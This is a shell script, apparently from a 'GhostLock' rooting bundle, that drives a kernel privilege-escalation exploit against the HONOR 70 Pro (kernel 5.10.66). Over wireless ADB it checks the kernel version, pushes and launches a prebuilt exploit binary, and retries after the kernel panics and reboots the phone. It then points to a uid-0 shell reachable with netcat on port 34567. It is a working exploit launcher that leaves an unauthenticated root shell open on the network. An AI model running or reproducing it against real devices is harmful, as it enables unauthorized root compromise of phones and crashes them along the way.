#!/bin/sh
# GhostLock temporary-root driver for the HONOR 70 Pro (SDY-AN00).
#
#   sh setup.sh [serial]            (default 192.168.1.30:5555)
#   sh setup.sh 192.168.1.30:5555
#
# Runs on a PC that has `adb`, with the phone reachable over wireless
# debugging. The flow is:
#   connect -> confirm the running kernel is the one this bundle targets ->
#   stage the exploit -> launch it detached -> wait for the "chain complete"
#   marker -> tell you how to get a uid-0 shell.
#
# A miss reboots the phone (the kernel is built with CONFIG_PANIC_ON_OOPS=y, so
# there is no harmless failure): the script waits for it to come back and runs
# the exploit again, up to ATTEMPTS times.
#
# Keep this file POSIX/mksh-clean.

HERE="$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)"
PAYLOAD="$HERE/payload"

SERIAL="${1:-192.168.1.30:5555}"
IP="${SERIAL%%:*}"
RD=/data/local/tmp/glrun_sdy
ATTEMPTS=4

# The kernel this bundle's offsets were derived from.
KERNEL_EXPECT="5.10.66-android12-9-ge639f4185278"

ADB="adb -s $SERIAL"

die() { echo "!! $*" >&2; exit 1; }

command -v adb >/dev/null 2>&1 || die "adb not found in PATH"
[ -f "$PAYLOAD/exploit_static" ] || die "missing $PAYLOAD/exploit_static (incomplete unpack?)"

# Wait until `adb get-state` reports the device, up to ~2 minutes.
wait_device() {
  i=0
  while [ $i -lt 24 ]; do
    [ "$($ADB get-state 2>/dev/null | tr -d '\r')" = "device" ] && return 0
    sleep 5; i=$((i + 1))
  done
  return 1
}

echo "== GhostLock for HONOR 70 Pro (SDY-AN00)"
echo "== target: $SERIAL"

$ADB connect "$SERIAL" >/dev/null 2>&1
wait_device || die "device $SERIAL not reachable — is wireless debugging on?"

K="$($ADB shell uname -r 2>/dev/null | tr -d '\r')"
[ -n "$K" ] || die "could not read the device kernel version"
if [ "$K" != "$KERNEL_EXPECT" ]; then
  echo "!! running kernel is $K"
  echo "!! this bundle targets $KERNEL_EXPECT"
  printf "!! offsets may be wrong; continue anyway? [y/N] "
  read -r A
  case "$A" in y|Y) ;; *) die "aborted" ;; esac
fi
echo "== kernel: $K"

try_once() {
  n="$1"
  echo "== attempt $n/$ATTEMPTS"
  $ADB shell "mkdir -p $RD" >/dev/null 2>&1 || return 1
  $ADB push "$PAYLOAD/exploit_static" "$RD/gl_sdy" >/dev/null || return 1
  $ADB shell "chmod 755 $RD/gl_sdy" >/dev/null 2>&1
  $ADB shell "rm -f $RD/gl.log; cd $RD && nohup env KSU_RUNDIR=$RD \
              $RD/gl_sdy > $RD/gl.log 2>&1 &" >/dev/null 2>&1

  i=0
  while [ $i -lt 40 ]; do
    sleep 3; i=$((i + 1))
    if $ADB shell "grep -qa 'chain complete' $RD/gl.log 2>/dev/null" 2>/dev/null; then
      return 0
    fi
    # device gone -> it missed and rebooted; wait for it to come back
    if [ "$($ADB get-state 2>/dev/null | tr -d '\r')" != "device" ]; then
      echo "   exploit missed, device rebooting (this is expected) — waiting..."
      $ADB connect "$SERIAL" >/dev/null 2>&1
      wait_device || return 1
      return 1
    fi
  done
  return 1
}

ok=0
n=1
while [ $n -le $ATTEMPTS ]; do
  if try_once "$n"; then ok=1; break; fi
  n=$((n + 1))
done

if [ "$ok" != 1 ]; then
  echo "!! exploit did not land after $ATTEMPTS attempts."
  echo "   The phone probably rebooted each time. Just re-run this script."
  exit 1
fi

echo
echo "== ROOT READY (chain complete)"
echo "   SELinux : $($ADB shell getenforce 2>/dev/null | tr -d '\r')"
echo "   root sh : nc $IP 34567        (uid=0 shell; lasts until reboot)"
echo "   adb sh  : adb -s $SERIAL shell"
echo
echo "   This is a TEMPORARY root: a reboot restores everything."
echo "   KernelSU is NOT part of this bundle: it does not work on this kernel"
echo "   (see docs/KSU.md). The exploit is a temporary root only."
